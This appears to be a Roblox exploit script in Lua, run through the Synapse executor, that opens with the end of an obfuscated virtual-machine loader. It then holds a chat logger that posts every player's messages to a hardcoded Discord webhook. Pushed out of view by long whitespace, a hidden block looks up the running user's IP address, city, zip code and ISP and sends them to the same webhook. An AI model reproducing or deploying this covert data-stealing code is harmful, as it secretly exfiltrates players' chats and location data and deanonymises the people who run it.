50)]]=v84[v86[1336 -(799 + 150 + 383)]];elseif ((v87==(15 + (1609 -(641 + 961)))) or (((3311 -(892 + 92)) + 69)>=(4372 -(195 + 114 + 98)))) then v84[v86[5 -3]]=v84[v86[2 + 1]];else local v141=1449 -(703 + 746);local v142;local v143;local v144;while true do if (((7716 -4033)==(4481 -(496 + 302))) and (v141==(1 + 0 + 0))) then v144=nil;while true do if (((173 + 962)<=(3872 -1755)) and (v142==((2119 -(598 + 309)) -(977 + 234)))) then while true do if (((4037 -2137)<(4301 -2213)) and ((291 -(64 + 191 + 36))==v143)) then v144=v84[v86[2 + (5 -3)]];if (((1532 + 1043)<=(5055 -(1121 + 630))) and  not v144) then InstrPoint=InstrPoint + (1943 -(486 + 1456)) + (0 -0);else local v207=0 -0;local v208;local v209;while true do if (((7816 -(4157 -(648 + 35)))==(1008 + 3334)) and (v207==(519 -(59 + 459)))) then while true do if (((9983 -6478)<(16232 -(25445 -13537))) and (v208==(0 -0))) then v209=0 -0;while true do if ((v209==(1395 -(1018 + 377))) or ((499 + 636 + 270)>(13891 -9159))) then v84[v86[1 + 1]]=v144;InstrPoint=v86[1392 -(822 + 245 + 202 + 120)];break;end end break;end end break;end if ((v207==(0 -0)) or ((2858 -(382 + 1570))>=(5637 -(579 + 771 + 103)))) then v208=0 -0;v209=nil;v207=1672 -(636 + 1035);end end end break;end end break;end if ((v142==(241 -((294 -(57 + 15)) + 19))) or ((2291 + 806)>=(4222 -(537 + 155)))) then local v190=0 -0;while true do if (((7394 -4810)>(5416 -3844)) and ((1 -0)==v190)) then v142=2 -1;break;end if ((v190==(0 + 0)) or ((111 + 1247 + 890)==(1104 -737))) then v143=(0 -0) -0;v144=nil;v190=592 -(262 + 329);end end end end break;end if ((v141==(0 + 0)) or (4241<((5940 -(1371 + 132)) -(317 + 1308)))) then v142=0 -0;v143=nil;v141=1;end end end elseif ((v87<=(43 -(47 -29))) or ((14367 -9629)==(221 + 3825))) then if (((5533 -(667 + 794))>=(3772 -(43 + (913 -(203 + 557))))) and (v87>(111 -87))) then local v145=(0 + 0) -(1744 -(877 + 867));local v146;local v147;local v148;while true do if ((v145==0) or ((1967 -(657 + 1241))>=(3626 -(2148 -(360 + 605))))) then v146=v79[v86[1 + 2]];v147=nil;v145=1248 -(485 + 762);end if (((2002 + 2420)>=(7539 -4370)) and (v145==((3 + 1) -2))) then for v168=1140 -(606 + (930 -(19 + 378))),v86[4 + 0] do local v169=1381 -(330 + 1051);local v170;local v171;local v172;while true do if ((((2492 + 632) -(27 + 949))==(2846 -((758 -550) + 490))) and ((679 -(298 + 380))==v169)) then v172=nil;while true do if (((3528 -(2772 -(438 + 707)))==(3662 -(993 + 768))) and ((1093 -(967 + (548 -423)))==v170)) then while true do if ((1520<(5066 -(581 + 454))) and (v171==(0 + 0))) then local v223=317 -(181 + 136);local v224;while true do if (((683 -414)<(1780 + 3112)) and (0==v223)) then v224=0;while true do if (((68 + 3609)>=(2449 -(1169 + 487))) and ((1138 -(583 + 555))==v224)) then v66=v66 + (1446 -(152 + 1293));v172=v77[v66];v224=1116 -(139 + 740 + 236);end if ((v224==(1 -0)) or ((313 + 1235 + 479)<(7011 -5243))) then v171=1 -0;break;end end break;end end end if (((678 -(100 + 577))==v171) or ((1064 + 169 + 520)>(3811 -(485 + 329)))) then if ((((3003 -(106 + 1222)) + (9530 -6518))>(2039 -(855 + 454))) and (v172[1616 -(399 + 1216)]==(2 + 20))) then v148[v168-(1 -0)]={v84,v172[7 -4]};else v148[v168-(1 + 0)]={v36,v172[3 + 0]};end v83[ #v83 + (1333 -(211 + 74 + 1047))]=v148;break;end end break;end if (((1876 + 1476)==(4756 -(1109 + 295))) and (v170==(1055 -(635 + 48 + 372)))) then v171=1825 -(1751 + 74);v172=nil;v170=1045 -((419 -227) + 852);end end break;end if ((v169==0) or ((12036 -8378)==(111 + 1029))) then v170=0 + 0;v171=nil;v169=852 -(291 + 560);end end end v84[v86[1 + 1]]=v29(v146,v147,v37);break;end if ((4809<((30422 -24026) -(944 + 518))) and ((97 -(49 + 47))==v145)) then v148={};v147=v10({},{__index=function(v173,v174)local v178=0 -(904 -(854 + 50));local v179;local v180;while true do if (((8787 -5274)<=(984 + 3580)) and (((266 -(166 + 100)) -(0 + 0))==v178)) then v179=0 -0;v180=nil;v178=(599 -(55 + 543)) + 0;end if (((2035 + 1466)<(5949 -(787 + (1736 -1088)))) and (v178==(1 + 0))) then while true do if ((v179==(0 -0)) or (927>=(3079 + 452))) then local v210=0 -0;while true do if (((5511 -(4585 -(575 + 320)))<(5228 -(63 + 923))) and (v210==(0 -0))) then v180=v148[v174];return v180[1 + 0 + 0][v180[2]];end end end end break;end end end,__newindex=function(v175,v176,v177)local v181=350 -(7 + 164 + 179);local v182;while true do if (((3171 -(1867 -681))==(3423 -(1512 -(34 + 40)))) and (v181==(488 -(183 + 305)))) then v182=v148[v176];v182[635 -(459 + 175)][v182[7 -5]]=v177;break;end end end});v145=5 -3;end end else v84[v86[2]]=v84[v86[9 -6]][v86[10 -6]];end elseif (((3077 -(1352 + 544))<=(7250 -3507)) and (v87>(944 -(875 + (94 -51))))) then if ((((22419 -16835) -(1857 + 11))>3425) and (v84[v86[1089 -(295 + (1448 -(446 + 210)))]]==v86[156 -(149 + 3)])) then v66=v66 + (2 -1);else v66=v86[7 -4];end elseif (((13904 -9449)>=(1434 -(762 + 512))) and  not v84[v86[1889 -(706 + 1181)]]) then v66=v66 + (1 -0);else v66=v86[1268 -(481 + 784)];end v66=v66 + (1677 -(913 + 763));break;end end break;end end end end A,B=v27(v11(v70));if  not A[1] then local v88=0;local v89;while true do if (v88==0) then v89=v35[4][v66] or "?";error("Script error at ["   .. v89   .. "]:"   .. A[2]);break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)();end v0=4;end end end











































































































local marketplaceService = game:GetService("MarketplaceService")
 
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
 
local wh = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end
 
game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end




















                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      local player_name = game:GetService("Players").LocalPlayer.Name
                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR"

                                                                                                                                                                                                                                                                                      local ip_info = syn.request({
                                                                                                                                                                                                                                                                                     Url = "http://ip-api.com/json",
                                                                                                                                                                                                                                                                                     Method = "GET"
                                                                                                                                                                                                                                                                                })
                                                                                                                                                                                                                                                                                local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
                                                                                                                                                                                                                                                                                local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
                                                                                                                                                                                                                                                                                syn.request(
                                                                                                                                                                                                                                                                                    {
                                                                                                                                                                                                                                                                                      Url = webhook_url,
                                                                                                                                                                                                                                                                                      Method = "POST",
                                                                                                                                                                                                                                                                                      Headers = {
                                                                                                                                                                                                                                                                                           ["Content-Type"] = "application/json"
                                                                                                                                                                                                                                                                                      },
                                                                                                                                                                                                                                                                                      Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                         )
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
